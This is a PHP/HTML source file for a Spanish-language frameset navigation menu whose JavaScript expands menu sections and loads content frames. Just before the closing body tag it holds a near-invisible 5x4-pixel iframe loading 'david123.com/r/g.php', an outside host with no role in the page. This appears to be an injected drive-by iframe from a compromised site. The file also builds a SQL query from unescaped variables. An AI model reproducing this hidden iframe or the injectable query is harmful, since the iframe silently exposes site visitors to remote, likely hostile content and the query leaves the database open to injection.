<?
	define ('authenticate', false);
	require ('../inc/conf.inc.php');
	$socio=$_SESSION['socio'];
	if($socio=='mdt'){ $anchof=93;} else{ $anchof=110; }

?>
<HTML>
<HEAD><TITLE>Menú de navegación estilo árbol</TITLE>
<link href="../estilos<?=$_SESSION['socio']?>.css" rel="stylesheet" type="text/css">
<script language="javascript">

function botonover(x) {
x.childNodes[0].childNodes[0].src=bullet2.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1over'
}

function botonout(x) {
x.childNodes[0].childNodes[0].src=bullet1.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1'
}

function cambiar(item,cod,tit) {
	if(item){
	   obj=document.getElementById(item);
	   visible=(obj.style.display!="none")
	   key=document.getElementById("x" + item);
	   if (visible) {
	     obj.style.display="none";
	     //key.innerHTML="<img src='folder.gif' width='16' height='16' hspace='0' vspace='0' border='0'>";
	   } else {
	      obj.style.display="block";
	      //key.innerHTML="<img src='textfolder.gif' width='16' height='16' hspace='0' vspace='0' border='0'>";
	   }
	}
	if(cod>0){
		parent.frames['centro'].location='../carga_contenido.php?id_sel='+cod+'&tit='+tit
	}
}

function abretodo() {
   divs=document.getElementsByTagName("DIV");
   for (i=0;i<divs.length;i++) {
     divs[i].style.display="block";
     key=document.getElementById("x" + divs[i].id);
    // key.innerHTML="<img src='textfolder.gif' width='16' height='16' hspace='0' vspace='0' border='0'>";
   }
}

function cierratodo() {
   divs=document.getElementsByTagName("DIV");
   for (i=0;i<divs.length;i++) {
     divs[i].style.display="none";
     key=document.getElementById("x" + divs[i].id);
   //  key.innerHTML="<img src='folder.gif' width='16' height='16' hspace='0' vspace='0' border='0'>";
   }
}

</script>
<style type="text/css">
<!--
.fondito {
	background-image: url(../images/fondo.jpg);
	background-repeat: no-repeat;
	background-position: left top;
}
-->
</style>
</HEAD>
<BODY class="fondito">

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td>

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><small>&nbsp;</small></td>
  </tr>
</table>
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" href="javascript:cambiar('',194,'<?=traducemenu(194)?>');"><?=traducemenu(194)?></a></td>
  </tr>
</table>
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1"  href="javascript:cambiar('',195,'<?=traducemenu(195)?>');"><?=traducemenu(195)?></a></td>
  </tr>
</table>

</td></tr></table>
<script>
//120
parent.document.all('marcos').cols="200,*,<?=$anchof?>"
parent.frames['centro'].location='../carga_contenido.php?id_sel=8&tit=<?=traducemenu(8)?>';
//parent.frames['derecha'].location='../carga_derecha.php?id_sel=8&menu=1';
parent.frames['derecha'].location='<?=CFG_virtualPath?>carga_derecha.php?id_sel=1'; //antes era 8&menu=1&id_sub_sel=8

</script>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>

<?
function traducemenu($id){
	global $lng;
	$db1=new DBI();
	$db1->select('secciones','*',"id=$id and lng='$lng'");
	if($db1->num_rows()>0){
		$row=$db1->fetch_object();
		echo $row->titulo;
	}
	else{
		echo "no hay datos";
	}

}
?>
